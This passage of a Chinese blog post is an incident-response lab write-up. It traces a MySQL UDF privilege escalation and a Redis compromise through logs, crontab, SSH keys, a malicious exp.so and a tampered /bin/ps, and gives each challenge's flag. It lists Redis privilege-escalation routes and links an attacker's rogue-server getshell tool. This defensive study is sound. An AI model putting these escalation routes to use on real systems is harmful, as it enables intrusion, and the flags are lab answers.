class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>连接mysql</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br></pre></td></tr></table></figure>

<p>之后对 plugin 关键词进行排查，显示所有与 plugin 相关的系统变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005124059001.png" alt="image-20251005124059001"></p>
<p><img src="/images/image-20251005124126674.png" alt="image-20251005124126674"></p>
<p>确实存在udf.so文件，文件路径<code>/usr/lib/mysql/plugin/udf.so</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b1818bde4e310f3d23f1005185b973e7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客获取的权限"><a href="#黑客获取的权限" class="headerlink" title="黑客获取的权限"></a>黑客获取的权限</h3><p>使用<code>ps -aux</code>查看进程的详细信息，可以看到提权文件的运行后的权限为mysql，故 Flag 为 mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第二章日志分析-redis应急响应"><a href="#第二章日志分析-redis应急响应" class="headerlink" title="第二章日志分析-redis应急响应"></a>第二章日志分析-redis应急响应</h2><h3 id="分析黑客攻击成功的-IP-为多少"><a href="#分析黑客攻击成功的-IP-为多少" class="headerlink" title="分析黑客攻击成功的 IP 为多少"></a>分析黑客攻击成功的 IP 为多少</h3><p>先分析redis日志，路径<code>/var/log/redis.log</code></p>
<p><img src="/images/image-20251005131649130.png" alt="image-20251005131649130"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.100.20&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析黑客第一次上传的恶意文件"><a href="#分析黑客第一次上传的恶意文件" class="headerlink" title="分析黑客第一次上传的恶意文件"></a>分析黑客第一次上传的恶意文件</h3><p>分析日志</p>
<p><img src="/images/image-20251005131150853.png" alt="image-20251005131150853"></p>
<p>发现有个.&#x2F;exp.so</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /exp.so | grep -a &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005131543485.png" alt="image-20251005131543485"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析黑客反弹-shell-的IP-为多少"><a href="#分析黑客反弹-shell-的IP-为多少" class="headerlink" title="分析黑客反弹 shell 的IP 为多少"></a>分析黑客反弹 shell 的IP 为多少</h3><p>对于redis数据库提权一般来说有4种方法</p>
<ul>
<li>写密钥ssh</li>
<li>计划任务</li>
<li>反弹shell</li>
<li>CVE-2022-0543 沙盒绕过命令执行 （集成在template当中）</li>
</ul>
<p>这里面可以先排除反弹shell与CVE-2022-0543 因为反弹shell很容易出问题导致连接失败。</p>
<p>先看下有没有写公钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005131843312.png" alt="image-20251005131843312"></p>
<p>可以看到是写了公钥的。但仅靠公钥我们是找不到反弹Ip的</p>
<p>再查看计划任务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005131918976.png" alt="image-20251005131918976"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h3 id="溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串"><a href="#溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串" class="headerlink" title="溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串"></a>溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串</h3><p>由上一步已经得知用户名为<code>xj-test-user</code></p>
<p>用用户名去github里面搜索<a target="_blank" rel="noopener" href="https://github.com/xj-test-user/redis-rogue-getshell">https://github.com/xj-test-user/redis-rogue-getshell</a></p>
<p><img src="/images/1049983-20241029144803066-1531375887.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xj-test-user-wow-you-find-flag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析黑客篡改的命令"><a href="#分析黑客篡改的命令" class="headerlink" title="分析黑客篡改的命令"></a>分析黑客篡改的命令</h3><p>大多数Linux命令都是编译后的二进制可执行文件</p>
<p>这些可执行文件一般放置于 &#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;sbin 等目录中</p>
<p>我们到&#x2F;bin目录 按照时间顺序查看最新的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /bin/ps</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005132614950.png" alt="image-20251005132614950"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c195i2923381905517d818e313792d196&#125;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag"># 应急响应</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/10/03/newstar%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93/" rel="prev" title="newstar公开赛道">
                  <i class="fa fa-angle-left"></i> newstar公开赛道
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/10/09/%E6%8F%90%E6%9D%83-%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="next" title="提权_基础篇">
                  提权_基础篇 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">hllttz</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">322k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:52</span>
  </span>
</div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
